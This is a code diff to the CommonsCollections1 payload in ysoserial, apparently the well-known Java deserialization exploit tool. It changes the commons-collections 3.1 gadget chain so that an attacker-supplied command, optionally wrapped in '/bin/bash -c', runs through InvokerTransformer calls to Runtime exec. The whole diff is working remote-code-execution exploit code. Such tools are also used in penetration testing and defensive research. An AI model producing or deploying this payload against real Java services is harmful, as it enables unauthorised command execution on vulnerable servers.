@@ -10,6 +10,8 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
@@ -41,8 +43,26 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 	
+	@Bind private String command;
+	@Bind( defaultValue = "false" ) private boolean useShell;
+	@Bind( defaultValue = "/bin/bash" ) private String shell;
+	@Bind( defaultValue = "-c" ) private String shellParam;
+
+	
+	/**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
 	public InvocationHandler getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
+		return getObject();
+	}
+
+	public InvocationHandler getObject() throws Exception {
+		String[][] execArgs = new String[][] { { command } };
+		
+		if ( useShell ) { 
+			execArgs = new String[][] { { shell, shellParam, command } };
+		}
+		
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 			new Transformer[]{ new ConstantTransformer(1) });
@@ -55,8 +75,10 @@ public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<
 				new InvokerTransformer("invoke", new Class[] {
 					Object.class, Object[].class }, new Object[] {
 					null, new Object[0] }),
-				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
+				useShell ? new InvokerTransformer("exec",
+					new Class[] { String[].class }, execArgs) : 
+						new InvokerTransformer("exec",
+							new Class[] { String.class }, execArgs[0] ),
 				new ConstantTransformer(1) };
 
 		final Map innerMap = new HashMap();
